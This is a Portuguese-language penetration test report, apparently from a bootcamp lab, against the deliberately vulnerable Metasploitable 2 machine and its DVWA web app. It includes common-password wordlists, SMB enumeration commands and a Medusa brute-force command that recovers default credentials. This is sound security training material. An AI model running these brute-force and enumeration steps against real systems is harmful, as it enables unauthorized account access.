# Bootamp_Santander-2025

RELATÓRIO DE TESTE DE PENETRAÇÃO - METASPLOITABLE 2
ALVO: 192.168.56.102

RESUMO 

Este relatório documenta os testes de penetração realizados na máquina Metasploitable 2, focando em ataques de força bruta nos protocolos FTP, SMB e aplicação web DVWA. Foram identificadas múltiplas vulnerabilidades críticas de autenticação.

 METASPLOITABLE 2 - ALVO

- IP DO ALVO: 192.168.56.102
- SISTEMA: Metasploitable 2 (Linux vulnerável)
- SERVIÇOS TESTADOS: FTP, SMB, HTTP (DVWA)

WORDLIST CRIADA PARA ATAQUES

ARQUIVO: users.txt
admin
root
administrator
msfadmin
test
guest
user

ARQUIVO: password.txt
msfadmin
admin
password
123456
admin123
root
1234
12345
qwerty
letmein
monkey
welcome
abc123
password1
12345678
123456789
1234567890
111111
123123
admin@123
Admin@123
Pass@123
msfadmin123

1. ATAQUE FTP - FORÇA BRUTA

COMANDO EXECUTADO:
ftp 192.168.56.102

EVIDÊNCIAS ENCONTRADAS:
- SERVIÇO: vsFTPd 2.3.4
- CREDENCIAIS VALIDADAS: msfadmin:msfadmin
- ACESSO CONCEDIDO: Login bem-sucedido
- MODO DE TRANSFERÊNCIA: Binary mode ativado


2. ENUMERAÇÃO E ATAQUE SMB

COMANDOS EXECUTADOS:

2.1 Listagem de Compartilhamentos:
smbclient -L \\192.168.56.102 -U msfadmin

2.2 Enumeração Completa com enum4linux:
enum4linux -a 192.168.56.102 | tee enum4_output.txt

COMPARTILHAMENTOS IDENTIFICADOS:
| Sharename | Type | Comment |
|-----------|------|---------|
| print$    | Disk | Printer Drivers |
| tmp       | Disk | oh noes! |
| opt       | Disk | |
| IPC$      | IPC  | IPC Service |
| ADMIN$    | IPC  | IPC Service |
| msfadmin  | Disk | Home Directories |

USUÁRIOS ENUMERADOS:
- Administrator (Local User)
- nobody (Local User)
- root (Local User)
- msfadmin (Domain User)
- service (Domain User)
- user (Domain User)
- postgres (Domain User)

- CREDENCIAIS VALIDADAS: msfadmin:msfadmin

ANÁLISE DE VULNERABILIDADE SMB:
- Samba 3.0.20-Debian - versão antiga com vulnerabilidades conhecidas
- Múltiplos usuários com permissões excessivas
- Workgroup: WORKGROUP

3. ATAQUE DE FORÇA BRUTA - APLICAÇÃO WEB (DVWA)

COMANDO MEDUSA EXECUTADO:
medusa -h 192.168.56.102 -U users.txt -P password.txt -M http -m FORM:"/admin/login.php" -m FORM-DATA:"post?user=USER&pass=PASS" -t 5

CREDENCIAIS COMPROMETIDAS - DVWA:

| Usuário       | Senha      
|---------------|------------

| admin         | password   


ACESSO CONCEDIDO AO DVWA:
- USUÁRIO LOGADO: admin
- PHPIDS: disabled
- MÓDULOS ACESSÍVEIS: SQL Injection, XSS, File Upload, Command Execution

